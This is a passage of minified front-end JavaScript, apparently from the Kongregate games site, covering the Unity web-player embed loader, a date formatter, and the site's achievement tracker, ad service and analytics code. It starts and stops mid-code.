t=T.getElementById(e);if(t){if(te.win&&te.ie){var i=t.firstChild;if(i&&"OBJECT"==i.nodeName)return t.style.display="none",void function(){if(4==i.readyState){for(var e in i)"function"==typeof i[e]&&(i[e]=null);t.parentNode.removeChild(t)}else setTimeout(arguments.callee,10)}()}t.parentNode.removeChild(t)}}function y(e,t){return(e=T.getElementById(e))?(te.win&&te.ie?(e=e.getElementsByTagName("object")[0])&&"OBJECT"==e.nodeName&&(i=e):(e=e.getElementsByTagName("embed")[0])&&"EMBED"==e.nodeName&&(i=e),function(){return i&&void 0===i.GetPluginVersion?(t&&setTimeout(arguments.callee,10),null):(t&&t(i),i)}()):(t&&t(null),null);var i}function E(e,t){if(N)if(t=t?"visible":"hidden",A&&T.getElementById(e))T.getElementById(e).style.visibility=t;else if(e="#"+e,t="visibility: "+t+";",!te.mac||!te.ie){var i=T.getElementsByTagName("head")[0];if(i){if(!M||"screen"!=I){var n=T.createElement("style");n.setAttribute("type","text/css"),n.setAttribute("media","screen"),M=i.appendChild(n),te.win&&te.ie&&void 0!==T.styleSheets&&0<T.styleSheets.length&&(M=T.styleSheets[T.styleSheets.length-1]),I="screen"}te.win&&te.ie&&"object"==typeof M.addRule?M.addRule(e,t):M&&void 0!==T.createTextNode&&M.appendChild(T.createTextNode(e+" { "+t+" }"))}}}function S(){for(var e in O)try{var t=O[e];t.target.detachEvent(t.type,t.event)}catch(e){}for(e in R)b(R[e]);for(e in te)te[e]=null;for(e in te=null,unityObject)unityObject[e]=null;unityObject=null}var w=window,T=document,C=navigator,A=!1,k=[],R=[],O=[],M=null,I=null,N=!0,L=!0,D="https:"==document.location.protocol,x=D?"https://ssl-webplayer.unity3d.com/":"http://webplayer.unity3d.com/",P=D?"https://ssl-webplayer.unity3d.com/":"http://webplayer.unity3d.com/",U=x+"download_webplayer-3.x/",H=!1,K=!1,G=!0,j=!1,F=n("_unity_triedjava"),$=[],W=!0,B=!1,q=!D&&!1,V=!0,z=!1,Y=null,J=[],X=[],Q=[],Z=null,ee=null,te=function(){function e(e,t){for(var i=0;i<Math.max(e.length,t.length);++i){var n=i<e.length&&e[i]?new Number(e[i]):0,s=i<t.length&&t[i]?new Number(t[i]):0;if(n<s)return-1;if(n>s)return 1}return 0}var t=C.userAgent,i=C.platform,n=!1;/msie/i.test(t)?n=parseFloat(t.replace(/^.*msie ([0-9]+(\.[0-9]+)?).*$/i,"$1")):/Trident/i.test(t)&&(n=parseFloat(t.replace(/^.*rv:([0-9]+(\.[0-9]+)?).*$/i,"$1")));var s={w3:void 0!==T.getElementById&&void 0!==T.getElementsByTagName&&void 0!==T.createElement,win:/win/i.test(i||t),mac:/mac/i.test(i||t),ie:n,ff:/firefox/i.test(t),ch:/chrome/i.test(t),sf:/safari/i.test(t),wk:!!/webkit/i.test(t)&&parseFloat(t.replace(/^.*webkit\/(\d+(\.\d+)?).*$/i,"$1")),x64:/win64/i.test(t)&&/x64/i.test(t),moz:/mozilla/i.test(t)?parseFloat(t.replace(/^.*mozilla\/([0-9]+(\.[0-9]+)?).*$/i,"$1")):0};for(i=T.getElementsByTagName("script"),n=0;n<i.length;++n){var o=i[n].src.match(/^(.*)3\.0\/uo\/UnityObject\.js$/i);if(o){U=o[1];break}}return s.java=function(){if(C.javaEnabled()){var t=s.win&&s.ff;if(t){if(void 0!==C.mimeTypes){var i=t?[1,6,0,12]:[1,4,2,0];for(t=0;t<C.mimeTypes.length;++t)if(C.mimeTypes[t].enabledPlugin){var n=C.mimeTypes[t].type.match(/^application\/x-java-applet;(?:jpi-)?version=(\d+)(?:\.(\d+)(?:\.(\d+)(?:_(\d+))?)?)?$/);if(null!=n&&0>=e(i,n.slice(1)))return!0}}}else if(s.win&&s.ie&&"undefined"!=typeof ActiveXObject){if(t=function(e){try{return null!=new ActiveXObject("JavaWebStart.isInstalled."+e+".0")}catch(e){return!1}},t("1.7.0"))return!0;if(!(8<=s.ie))return t("1.6.0")||t("1.5.0")||t("1.4.2");if(t("1.6.0"))for(t=12;50>=t;++t){try{i=null!=new ActiveXObject("JavaPlugin.160_"+t)}catch(e){i=!1}if(i&&!(9==s.ie&&5==s.moz&&24>t))return!0}}}return!1}(),s.co=function(){if(s.win&&s.ie){var i=t.match(/(\.NET CLR [0-9.]+)|(\.NET[0-9.]+)/g);if(null!=i)for(var n=[3,5,0],o=0;o<i.length;++o){if(0>=e(n,i[o].match(/[0-9.]{2,}/g)[0].split(".")))return!0}}return!1}(),s}(),ie=function(){function e(e,n,s,o){if(q){e="http://unityanalyticscapture.appspot.com/event?u="+encodeURIComponent(t)+"&s="+encodeURIComponent(i)+"&e="+encodeURIComponent(e),Z&&(e+="?r="+Z),n&&(e+="&t="+encodeURIComponent(n)),s&&(e+="&d="+encodeURIComponent(s));var a=new Image;if(o){var r=null;a.onload=a.onerror=function(){clearTimeout(r),a.onload=a.onerror=null,o()},r=setTimeout(a.onload,3e3)}a.src=e}else o&&o()}var t=function(){var e=new Date;return Date.UTC(e.getUTCFullYear(),e.getUTCMonth(),e.getUTCDay(),e.getUTCHours(),e.getUTCMinutes(),e.getUTCSeconds(),e.getUTCMilliseconds()).toString(16)+Math.floor(2147483647*Math.random()).toString(16)}(),i=0;return{send:function(t,n,s,o){function a(){0==--r&&(location.href=o)}++i;var r=2;e(t,n,s,o?a:null),function(e,t,i,n){if(V){var s=window._ugaq=window._ugaq||[];z||s.push(["unity._setAccount","UA-16068464-16"]),e="/webplayer/install/"+e;var o="?";if(t&&(e+=o+"t="+encodeURIComponent(t),o="&"),i&&(e+=o+"d="+encodeURIComponent(i),o="&"),n){t=function(){unityObject.googleAnalyticsCallback=null,clearTimeout(a),n()},unityObject.googleAnalyticsCallback=t;var a=setTimeout(t,3e3)}if(s.push(["unity._trackPageview",e]),!z){for(s=U+"3.0/uo/ga.js",t=T.getElementsByTagName("script"),i=0;i<t.length;++i)if(t[i].src&&t[i].src.toLowerCase()==s.toLowerCase()){z=!0;break}z||(z=!0,(t=T.createElement("script")).type="text/javascript",t.async=!0,t.src=s,(s=document.getElementsByTagName("script")[0]).parentNode.insertBefore(t,s))}}else n&&n()}(t,n,s,o?a:null)}}}();return te.w3&&((void 0!==T.readyState&&"complete"==T.readyState||void 0===T.readyState&&(T.getElementsByTagName("body")[0]||T.body))&&o(),A||(void 0!==T.addEventListener?T.addEventListener("DOMContentLoaded",o,!1):te.win&&te.ie&&(T.attachEvent("onreadystatechange",(function(){"complete"==T.readyState&&(T.detachEvent("onreadystatechange",arguments.callee),o())})),w==top&&function(){if(!A){try{T.documentElement.doScroll("left")}catch(e){return void setTimeout(arguments.callee,10)}o()}}()),te.wk&&function(){A||(/loaded|complete/.test(T.readyState)?o():setTimeout(arguments.callee,10))}(),a(o))),function(){if(te.win&&te.ie)if(void 0!==w.attachEvent)r(w,"onunload",S);else if("function"==typeof w.onunload){var e=w.onunload;w.onunload=function(){e(),S()}}else w.onunload=S}(),{missingUnityId:null,minRequiredVersion:"3.0.0",embedUnity:function(e,t,i,n,o,a,r){te.w3&&!(te.wk&&312>te.wk)&&e&&t&&i&&n?s((function(){var s=function(e,t,i){var n={},s=-1;if(e&&"object"==typeof e)for(var o in e)n[o]=e[o],"tabindex"==o.toLowerCase()&&(s=n[o]);return n.width=t,n.height=i,-1==s&&(n.tabIndex=0),n}(a,i,n),c=function(e,t){var i="unityObject.firstFrameCallback();",n={};if(e&&"object"==typeof e)for(var s in e)n[s]=e[s],"firstframecallback"==s.toLowerCase()&&(n[s]=i+n[s],i=null);return i&&(n.firstFrameCallback=i),n.src=t,n}(o,t);d((function(t){"installed"==t?l(e,s,c,r):"unsupported"==t?function(e,t,i,n,s){var o=T.getElementById(e);if(o){var a=u(t.width);t=u(t.height);var r=_(i,"backgroundcolor"),c=_(i,"textcolor"),h=_(i,"bordercolor");te.win&&te.ie&&(i="font-family: Verdana; font-size: 12px; text-align: center;",r&&(i+=" background-color: #"+r+";"),c&&(i+=" color: #"+c+";"),h&&(i+=" border: 1px solid #"+h+";"),r="",L&&(i+=" width: "+a+"; height: "+t+";",r="width: "+a+"; line-height: "+t+";"),o.outerHTML='<div id="'+e+'" style="'+i+'"><span style="'+r+'">'+s+"</span></div>")}n&&n({success:!1,id:e,error:s})}(e,s,c,r,"Unsupported browser."):(m(unityObject.missingUnityId||e,s,c,r,"broken"==t,null,"NotInstalled"),function(){var t=arguments.callee;d((function(i){"installed"==i?(E(e,!1),l(e,s,c,r)):setTimeout(t,500)}))}())}))})):r&&r({success:!1,id:e})},addPreInstallCallback:function(e,t){X[e]=t},addBeginInstallCallback:function(e,t){J[e]=t},getObjectById:function(e,t){return te.w3&&e?y(e,t):(t&&t(null),null)},setAutoHideShow:function(e){N=e},setFullSizeMissing:function(e){L=e},enableFullInstall:function(e){H=e},enableAutoInstall:function(e){K=e},enableJavaInstall:function(e){G=e},enableJavaPreloading:function(e,t){j=e,void 0!==t&&(Q=t)},enableClickOnceInstall:function(e){W=e},enableAnalytics:function(e){q=!D&&e,V=e},enableUnityAnalytics:function(e){q=!D&&e},enableGoogleAnalytics:function(e){V=e},setBaseDomain:function(e){var t=x;"/"!=(x=e)[x.length-1]&&(x+="/"),U=x+U.substr(t.length)},setBaseDownloadUrl:function(e){"/"!=(U=e)[U.length-1]&&(U+="/"),x=e.match(/([^:]*):\/\/([^/]*)/)[0]+"/"},setReferrer:function(e){Z=e?encodeURIComponent(e):e},addLoadEvent:a,addDomLoadEvent:s,ua:te,detectUnity:function(e,t){!te.w3||te.wk&&312>te.wk||!e?e&&e("missing"):s((function(){d(e,t)}))},createUnity:function(e,t,i,n){te.w3&&!(te.wk&&312>te.wk)&&e&&t&&i&&n?l(e,i,t,n):n&&n({success:!1,id:e})},removeUnity:function(e){te.w3&&b(e)},notifyBeginInstall:function(e,t){(callback=J[e])&&callback({id:e,type:t})},setInstallStatus:function(e,i,n,s){t(e,i,n,s)},doJavaInstall:function(e){v(e)},jvmPreloaded:function(e){!function(e){setTimeout((function(){var t=T.getElementById(e);t&&t.parentNode.removeChild(t)}),0)}(e)},appletStarted:function(e){},javaInstallDone:function(e,t,i){setTimeout('unityObject.javaInstallDoneDirect("'+e+'", '+t+', "'+i+'");',0)},javaInstallDoneDirect:function(e,i,n){i||(i=$[e],t("error","java",n),m(unityObject.missingUnityId||e,i.attributes,i.params,i.callback,i.broken,"java",n))},firstFrameCallback:function(){var e=Y;null!=ee&&(ee="first",ie.send("first",e,void 0))}}}();function addDOMLoadEvent(e){if(!window.__load_events){var t=function(){if(!arguments.callee.done){arguments.callee.done=!0,window.__load_timer&&(clearInterval(window.__load_timer),window.__load_timer=null);for(var e=0;e<window.__load_events.length;e++)window.__load_events[e]();window.__load_events=null}};document.addEventListener&&document.addEventListener("DOMContentLoaded",t,!1),/WebKit/i.test(navigator.userAgent)&&(window.__load_timer=setInterval((function(){/loaded|complete/.test(document.readyState)&&t()}),10)),window.onload=t,window.__load_events=[]}window.__load_events.push(e)}function tabset(){if(!document.getElementById)return!1;var e,t=document.getElementsByTagName("dl");for(k=0;k<t.length;k++){var n=t[k];if(-1!=n.className.indexOf("tabset")){var s=0,o=n.getElementsByTagName("dd");for(i=0;i<o.length;i++)o[i].parentNode==n&&(0===i?e=o.item(0):o[i].style.display="none",o[i].count=s++);for(s=[],o=n.getElementsByTagName("dt"),i=0;i<o.length;i++)o[i].parentNode==n&&(s[s.length]=o[i]);for(n=[],i=0;i<s.length;i++)s[i].transformed_to_tab||(s[i].transformed_to_tab=!0,s[i].count=i,s[i].onclick=toggleDt,s[i].innerHTML="<a href='#' title='"+s[i].innerHTML+"'>"+s[i].innerHTML+"</a>",s[i].parentNode.removeChild(s[i]),e.parentNode.insertBefore(s[i],e)),0<=s[i].className.indexOf("active")&&(n[n.length]=s[i]);for(i=0;i<n.length;i++)n[i].onclick()}}}function toggleDt(){var e=this.parentNode.getElementsByTagName("dt");for(i=0;i<e.length;i++)this==e[i]&&0<=this.className.indexOf("dormant")&&-1==this.className.indexOf("active")&&e[i].parentNode==this.parentNode?(this.className+=" active",this.className=this.className.replace(/(?:^\s*|\s*$)/,"")):this!=e[i]&&e[i].parentNode==this.parentNode&&(e[i].className=e[i].className.replace("active","dormant"));for(e=this.parentNode.getElementsByTagName("dd"),i=0;i<e.length;i++)e[i].parentNode==this.parentNode&&(e[i].style.display=this.count==e[i].count?"block":"none");return!1}addDOMLoadEvent(tabset);var dateFormat=function(){var e=/d{1,4}|m{1,4}|yy(?:yy)?|([HhMsTt])\1?|[LloSZ]|"[^"]*"|'[^']*'/g,t=/\b(?:[PMCEA][SDP]T|(?:Pacific|Mountain|Central|Eastern|Atlantic) (?:Standard|Daylight|Prevailing) Time|(?:GMT|UTC)(?:[-+]\d{4})?)\b/g,i=/[^-+\dA-Z]/g,n=function(e,t){for(e=String(e),t=t||2;e.length<t;)e="0"+e;return e};return function(s,o,a){var r=dateFormat;if(1!=arguments.length||"[object String]"!=Object.prototype.toString.call(s)||/\d/.test(s)||(o=s,s=void 0),s=s?new Date(s):new Date,isNaN(s))throw SyntaxError("invalid date");"UTC:"==(o=String(r.masks[o]||o||r.masks.default)).slice(0,4)&&(o=o.slice(4),a=!0);var c=a?"getUTC":"get",h=s[c+"Date"](),d=s[c+"Day"](),u=s[c+"Month"](),l=s[c+"FullYear"](),_=s[c+"Hours"](),m=s[c+"Minutes"](),p=s[c+"Seconds"]();c=s[c+"Milliseconds"]();var f=a?0:s.getTimezoneOffset(),g={d:h,dd:n(h),ddd:r.i18n.dayNames[d],dddd:r.i18n.dayNames[d+7],m:u+1,mm:n(u+1),mmm:r.i18n.monthNames[u],mmmm:r.i18n.monthNames[u+12],yy:String(l).slice(2),yyyy:l,h:_%12||12,hh:n(_%12||12),H:_,HH:n(_),M:m,MM:n(m),s:p,ss:n(p),l:n(c,3),L:n(99<c?Math.round(c/10):c),t:12>_?"a":"p",tt:12>_?"am":"pm",T:12>_?"A":"P",TT:12>_?"AM":"PM",Z:a?"UTC":(String(s).match(t)||[""]).pop().replace(i,""),o:(0<f?"-":"+")+n(100*Math.floor(Math.abs(f)/60)+Math.abs(f)%60,4),S:["th","st","nd","rd"][3<h%10?0:(10!=h%100-h%10)*h%10]};return o.replace(e,(function(e){return e in g?g[e]:e.slice(1,e.length-1)}))}}();function AccomplishmentGroup(e){this.initialize(e)}dateFormat.masks={default:"ddd mmm dd yyyy HH:MM:ss",shortDate:"m/d/yy",mediumDate:"mmm d, yyyy",longDate:"mmmm d, yyyy",fullDate:"dddd, mmmm d, yyyy",shortTime:"h:MM TT",mediumTime:"h:MM:ss TT",longTime:"h:MM:ss TT Z",isoDate:"yyyy-mm-dd",isoTime:"HH:MM:ss",isoDateTime:"yyyy-mm-dd'T'HH:MM:ss",isoUtcDateTime:"UTC:yyyy-mm-dd'T'HH:MM:ss'Z'"},dateFormat.i18n={dayNames:"Sun Mon Tue Wed Thu Fri Sat Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),monthNames:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec January February March April May June July August September October November December".split(" ")},Date.prototype.format=function(e,t){return dateFormat(this,e,t)},AccomplishmentGroup.prototype={initialize:function(e){this._id=e.id,this._scheduled_end=null,e.scheduled_end&&(this._scheduled_end=new Date(e.scheduled_end)),this._progress_content=null,this._dueling_group=e.dueling_group,this._name=e.name},id:function(){return this._id},name:function(){return this._name},scheduledEnd:function(){return this._scheduled_end},setProgressContent:function(e){this._progress_content=e},progressContent:function(){return this.expired()?null:this._progress_content},expired:function(){return!!(this._dueling_group&&active_user.duelingGroup()&&this._dueling_group!=active_user.duelingGroup()||this._scheduled_end&&new Date>this._scheduled_end)}},AccomplishmentTask=function(e){this.initialize(e)},AccomplishmentTask.AND_OPERATOR="AND",AccomplishmentTask.OR_OPERATOR="OR",AccomplishmentTask.prototype={initialize:function(e){this._id=e.id,this._quota=e.quota,this._operator=e.operator,this._statistic=e.statistic,this._current_progress=e.current_progress,this._statistic.addAccomplishmentTask(this)},quota:function(){return this._quota},isAndTask:function(){return AccomplishmentTask.AND_OPERATOR===this._operator},isOrTask:function(){return AccomplishmentTask.OR_OPERATOR===this._operator},id:function(){return this._id},statistic:function(){return this._statistic},progress:function(){return this._current_progress},isComplete:function(){return 0<=this._statistic.compare(this._quota,this._current_progress)},isUnprogressed:function(){var e=this.progress();return null==e},updateProgress:function(e,t){this.isComplete()||e!==this._statistic.id()||null==t||1>this._statistic.compare(this._current_progress,t)||(this._current_progress=t,this.trigger("progress",this),this.isComplete()&&this.trigger("complete",this))},displayValue:function(){return this.statistic().type(),this.isUnprogressed()?0:this.progress()},percentValue:function(){var e=this.statistic().type();return Statistic.ADD_TYPE==e||Statistic.MAX_TYPE==e?this.isUnprogressed()?e=0:(e=this.quota()+0,e=(this.progress()+0)/e*100):e=this.isComplete()?100:0,100<e&&(e=100),e},purgeProgress:function(){this._current_progress=void 0}},$j.extend(AccomplishmentTask.prototype,Evented),Accomplishment=function(e){this.initialize(e)},Accomplishment.prototype={initialize:function(e){var t=this;this._tasks=(e.accomplishment_tasks||[]).map((function(i){return i.statistic=e.statisticProvider(i.statistic_id),(i=new AccomplishmentTask(i)).on("complete",(function(e){t.trigger("task-complete",e)})),i.on("progress",(function(e){t.trigger("task-progress",e)})),i})),this._id=e.id,this._dom_id=e.dom_id,this._level=e.level,this._badge_id=e.badge_id,this._card_id=e.card_id,this._raffle_id=e.raffle_id,this._item_id=e.item_id,this._reward_points=e.reward_points,this._badge_of_the_day=e.badge_of_the_day,this._hidden=e.hidden,this._has_completion_tab_been_shown=!1,e.accomplishment_group&&(this._accomplishment_group=new AccomplishmentGroup(e.accomplishment_group)),e.scheduled_end&&(this._scheduled_end=new Date(1e3*e.scheduled_end))},id:function(){return this._id},domId:function(){return this._dom_id},tasks:function(){return this._tasks},andTasks:function(){return this.tasks().select((function(e){return e.isAndTask()}))},orTasks:function(){return this.tasks().select((function(e){return e.isOrTask()}))},isComplete:function(){if(this._complete)return!0;var e=!0;return 0<this.andTasks().length&&this.andTasks().any((function(e){return!e.isComplete()}))&&(e=!1),e&&0<this.orTasks().length&&this.orTasks().all((function(e){return!e.isComplete()}))&&(e=!1),e&&(this._complete=!0),e},isAchievement:function(){return!!this._level},isBadgeOfTheDay:function(){return this._badge_of_the_day},rank:function(){return[null,"badge_of_the_day","easy","medium","hard","impossible"].indexOf(this._level)},scheduledEnd:function(){return this._scheduled_end},isActive:function(){return!this.scheduledEnd()||this.scheduledEnd()>=new Date},isHidden:function(){return this._hidden},updateProgress:function(e,t){this.isComplete()||(this._tasks.forEach((function(i){i.updateProgress(e,t)})),this.isComplete()&&this.trigger("complete",this))},purgeProgress:function(){this._complete=!1,this.tasks().invoke("purgeProgress")},prizeName:function(){return this._card_id?"card":this._badge_id?"badge":this._raffle_id?"ticket":this._reward_points?"points":"reward"},hasCompletionTabBeenShown:function(){return this._has_completion_tab_been_shown},setHasCompletionTabBeenShown:function(){this._has_completion_tab_been_shown=!0},accomplishmentGroup:function(){return this._accomplishment_group},setAccomplishmentGroupProgressContent:function(e){this._accomplishment_group.setProgressContent(e)},accomplishmentGroupProgressContent:function(){var e=this.accomplishmentGroup();if(e)return e.progressContent()},hasCompleteAccomplishmentGroup:function(){return this.accomplishmentGroup()&&!this.accomplishmentGroup().expired()&&!this.accomplishmentGroup().progressContent()},hasItem:function(){return!!this._item_id}},$j.extend(Accomplishment.prototype,Evented),Statistic=function(e){this.initialize(e)},Statistic.ADD_TYPE="Add",Statistic.MAX_TYPE="Max",Statistic.MIN_TYPE="Min",Statistic.REPLACE_TYPE="Replace",Statistic.LOW="low",Statistic.MEDIUM="medium",Statistic.HIGH="high",Statistic.LOW_PRIORITY_MIN_WAIT_INTERVAL=12e4,Statistic.MEDIUM_PRIORITY_MIN_WAIT_INTERVAL=3e4,Statistic.HIGH_PRIORITY_MIN_WAIT_INTERVAL=15e3,Statistic.betterThanForType=function(e,t,i){return Statistic.ADD_TYPE!==i&&(!(null!=e&&!isNaN(e))||(Statistic.MIN_TYPE===i?t<e:Statistic.MAX_TYPE===i?t>e:t!=e))},Statistic.sortOnSentAt=function(e){return e.sort((function(e,t){return e.sentAt()===t.sentAt()?0:e.sentAt()<t.sentAt()?-1:1}))},Statistic.prototype={initialize:function(e){this._stat_type=e.stat_type,this._id=e.id,this._name=e.name,this._display_name=e.display_name,this._display_in_table=e.display_in_table,this._tasks=(e.tasks||[]).slice(),this.reset()},reset:function(){this._sent_at=this.getTime(),this._pending_value=this._saved_value=this.type()===Statistic.ADD_TYPE?0:null,this._current_value=null},name:function(){return this._name},displayName:function(){return this._display_name||this._name},id:function(){return this._id},type:function(){return this._stat_type},displayInTable:function(){return this._display_in_table},valueToSend:function(){return this._current_value},value:function(){return Statistic.ADD_TYPE===this.type()?this._saved_value+this._pending_value+this._current_value:this._current_value},pendingValue:function(){return this._pending_value},setPendingValue:function(e){this._pending_value=e},savedValue:function(){return this._saved_value},setSavedValue:function(e){this._saved_value=e},addAccomplishmentTask:function(e){this._tasks.push(e)},sentAt:function(){return this._sent_at},markAsSent:function(){this._sent_at=this.getTime(),Statistic.ADD_TYPE===this.type()?(this._pending_value+=this._current_value,this._current_value=0):this._pending_value=this._current_value},resetPendingValue:function(){Statistic.ADD_TYPE===this.type()?(this._current_value+=this._pending_value,this._pending_value=0):this._pending_value=null},priority:function(){return this.hasIncompleteTasks()?Statistic.HIGH:this._display_in_table?Statistic.MEDIUM:Statistic.LOW},hasIncompleteTasks:function(){return 0<this.incompleteTasks().length},incompleteTasks:function(){var e=this.value(),t=this.type(),i=this;return null==e?this._tasks.slice():this._tasks.filter((function(n){return!n.isComplete()&&(Statistic.MIN_TYPE===t?e>n.quota():Statistic.ADD_TYPE===t?e-i._saved_value+n.progress()<n.quota():e<n.quota())}))},pending:function(){return this.type()===Statistic.ADD_TYPE?null!==this._pending_value&&0!==this._pending_value:null!==this._pending_value},attemptUpdate:function(e){var t=!1,i=this.incompleteTasks();return Statistic.ADD_TYPE===this.type()?(this._current_value+=e,t=0!==e):this.betterThanCurrentValue(e)&&(this._current_value=e,t=!0),t&&i.length!=this.incompleteTasks().length&&(Kongregate.Log.debug("Incomplete tasks list for "+this.name()+" changed"),this._sent_at=0),t},betterThanCurrentValue:function(e){return Statistic.betterThanForType(this.value(),e,this.type())},betterThanSavedValue:function(e){return Statistic.betterThanForType(this._saved_value,e,this.type())},betterThanPendingValue:function(e){return Statistic.betterThanForType(this._pending_value,e,this.type())},dirty:function(){var e=this.valueToSend();return!isNaN(e)&&null!=e&&(Statistic.ADD_TYPE===this.type()?0!==e:this.betterThanSavedValue(e)&&this.betterThanPendingValue(e))},minWaitInterval:function(){switch(this.priority()){case Statistic.LOW:return Statistic.LOW_PRIORITY_MIN_WAIT_INTERVAL;case Statistic.MEDIUM:return Statistic.MEDIUM_PRIORITY_MIN_WAIT_INTERVAL;case Statistic.HIGH:return Statistic.HIGH_PRIORITY_MIN_WAIT_INTERVAL;default:return 3e5}},readyToSend:function(){if(!this.dirty())return!1;var e=this.sentAt();return 0===e||this.getTime()-e>=this.minWaitInterval()},sendImmediately:function(){return this.dirty()&&0===this.sentAt()},getTime:function(){return(new Date).getTime()},compare:function(e,t){return void 0===e?1:void 0===t?-1:e==t?0:this._stat_type==Statistic.MIN_TYPE?e>t?1:-1:e<t?1:-1}},AccomplishmentTracker=function(e){this.initialize(e)},AccomplishmentTracker.prototype={initialize:function(e){this._accomplishments=[],this._statistics=[],this._buffered_events=[],this._accomplishments_ever_set=!1,this._earned_as_guest=Cookie.get("guest_accomplishments"),this._guest_points=parseInt(Cookie.get("guest_points")||0,10),this._stat_values={},this._watch_stats=!1,this._earned_as_guest=this._earned_as_guest?this._earned_as_guest.split(","):[],e.statistics&&this.setStatistics(e.statistics),e.accomplishments&&this.setAccomplishments(e.accomplishments)},purgeProgress:function(){this.accomplishments().invoke("purgeProgress")},setAccomplishmentsProgress:function(e){this.purgeProgress();var t=this;try{this._setting_progress=!0,e.pluck("accomplishment_tasks").flatten().each((function(e){t.updateProgress(e.statistic_id,e.current_progress)}))}finally{this._setting_progress=!1}},setAccomplishments:function(e){var t=this;this._accomplishments_ever_set=!0,this._accomplishments=[];for(var i=e.length-1;0<=i;i--){var n=e[i];n.statisticProvider=this.getStatisticById.bind(this),(n=new Accomplishment(n)).on("task-complete",(function(e){t.trigger("task-complete",e)})),n.on("task-progress",(function(e){t.trigger("task-progress",e)})),n.on("complete",(function(e){return t._setting_progress||t.trigger("accomplishment-complete",e)})),this._accomplishments.push(n)}var s=this;this._buffered_events.each((function(e){s.onStatisticUpdated(e)})),this._buffered_events=[]},getAccomplishmentById:function(e){return this.accomplishments().detect((function(t){return e==t.id()}))},accomplishmentHasInProgressGroup:function(e){(e=this.getAccomplishmentById(e))&&e.setAccomplishmentGroupInProgress()},accomplishments:function(){return this._accomplishments.select((function(e){return e.isActive()&&!e.isHidden()}))},achievements:function(){return this.accomplishments().filter((function(e){return e.isAchievement()}))},completeAchievements:function(){return this.achievements().filter((function(e){return e.isComplete()}))},statistics:function(){return this._statistics},setStatistics:function(e){this._statistics=[];for(var t=e.length-1;0<=t;t--)this._statistics.push(new Statistic(e[t]))},onStatisticUpdated:function(e){this._accomplishments_ever_set?this.updateProgress(e.data.id,e.data.value):this._buffered_events.push(e)},completeAccomplishments:function(){return this.accomplishments().select((function(e){return!e.isHidden()&&e.isComplete()})).sortBy((function(e){return e.rank()}))},incompleteAccomplishments:function(){return this.accomplishments().select((function(e){return!e.isComplete()})).sortBy((function(e){return e.rank()}))},hiddenAccomplishments:function(){return this.accomplishments().select((function(e){return e.isHidden()}))},nextAccomplishment:function(){if(0===this._earned_as_guest.size())return this.incompleteAccomplishments()[0];var e=this;return this.incompleteAccomplishments().find((function(t){return!e._earned_as_guest.include(t.id())}))},getStatisticById:function(e){return this._statistics.detect((function(t){return e===t.id()}))||new Statistic({id:e})},updateProgress:function(e,t){this._watch_stats&&this.statWatch(e,t),this.accomplishments().forEach((function(i){i.updateProgress(e,t)}))},accomplishmentForId:function(e){return this.accomplishments().find((function(t){return t.id()==e}))},getTime:function(){return new Date},startWatchingStats:function(){console.log("Started watching stats"),this._watch_stats=!0},statWatch:function(e,t){var i=this.getStatisticById(e);i?(0<i.compare(this._stat_values[e],t)&&console.log("Statistic %o id %o updated to value %o",i.name(),e,t),this._stat_values[e]=t):console.log("no such stat")},threeAMTomorrow:function(){var e=new Date;return e.setMinutes(0),e.setSeconds(0),e.setMilliseconds(0),3<=e.getHours()?e.setTime(e.getTime()+36e5*(24-(e.getHours()-3))):e.setTime(e.getTime()+36e5*(3-e.getHours())),e},recordGuestAccomplishment:function(e){this._earned_as_guest.include(e.id())||(this._earned_as_guest.push(e.id()),this._guest_points+=e._reward_points,Cookie.setWithDate("guest_points",this._guest_points,this.threeAMTomorrow()),Cookie.setWithDate("guest_accomplishments",this._earned_as_guest,this.threeAMTomorrow()))}},$j.extend(AccomplishmentTracker.prototype,Evented),AdService=function(e){this.initialize(e)},AdService.prototype={initialize:function(e){var t=this;this._eventDispatcher=e.event_dispatcher,this._adManagers=[],[window.supersonicAdManager,window.hyprMXAdManager,window.trueXAdManager,e.ad_manager].each((function(e){e&&(e.setReceiver(t),t._adManagers.push(e))})),this._adManager=this._adManagers.pop(),this._adsReady=this._adShowing=this._campaignCompleted=this._initialized=!1,this._eventDispatcher.register(KonduitEvent.ADS_INITIALIZE,this.onInitializeAds.bind(this)),this._eventDispatcher.register(KonduitEvent.ADS_SHOW_INCENTIVIZED,this.onShowAd.bind(this))},onInitializeAds:function(){this._initialized?this._adsReady?(Kongregate.Log.warn("Ad service already initialized, sending ads available"),this._eventDispatcher.sendMessage(KonduitEvent.ADS_AVAILABLE)):(Kongregate.Log.warn("Ad service already initialized, sending ads unavailable"),this._eventDispatcher.sendMessage(KonduitEvent.ADS_UNAVAILABLE)):(this._initialized=!0,this._adManager?this._adManager.readyForAds():(Kongregate.Log.info("No ad managers available"),this.onCampaignsDone()),Kongregate.Log.info("AdService initialized!"))},onNoAdAvailable:function(){(this._adManager=this._adManagers.pop())&&(this._initialized=!1,this.onInitializeAds())},onShowAd:function(){this._adsReady?this._adShowing?Kongregate.Log.warn("Ad already showing, ignoring call"):(this._adManager.showAd(),this._adShowing=!0,this._campaignCompleted=!1,this._eventDispatcher.sendMessage(KonduitEvent.AD_OPENED)):(Kongregate.Log.warn("No ads ready, not attempting to display ad"),this._eventDispatcher.sendMessage(KonduitEvent.ADS_UNAVAILABLE),this._eventDispatcher.sendMessage(KonduitEvent.AD_ABANDONED))},onCampaignsReady:function(){Kongregate.Log.info("Ad campaigns ready!"),this._adsReady=!0,this._eventDispatcher.sendMessage(KonduitEvent.ADS_AVAILABLE)},onCampaignsDone:function(){Kongregate.Log.info("Ad campaigns done!"),this._adsReady=!1,this._eventDispatcher.sendMessage(KonduitEvent.ADS_UNAVAILABLE)},onCampaignCompleted:function(){Kongregate.Log.info("Ad campaign completed!"),this._campaignCompleted=!0},onCampaignClose:function(){Kongregate.Log.info("Ad campaign closed, completed="+this._campaignCompleted),this._eventDispatcher.sendMessage(this._campaignCompleted?KonduitEvent.AD_COMPLETED:KonduitEvent.AD_ABANDONED),this._campaignCompleted=this._adShowing=!1}},AnalyticsService=function(e){this.initialize(e)},AnalyticsService.prototype={initialize:function(e){this._activeUser=e.active_user||window.active_user,this._eventDispatcher=e.event_dispatcher,this._eventDispatcher.register(KonduitEvent.ANALYTICS_PAYLOAD,this.onAnalyticsPayloadRequest.bind(this))},sendAnalyticsPayload:function(e){if(!this._activeUser.analyticsInfo()||this._lastUserId===this._activeUser.id())return!1;this._lastUserId=this._activeUser.id();var 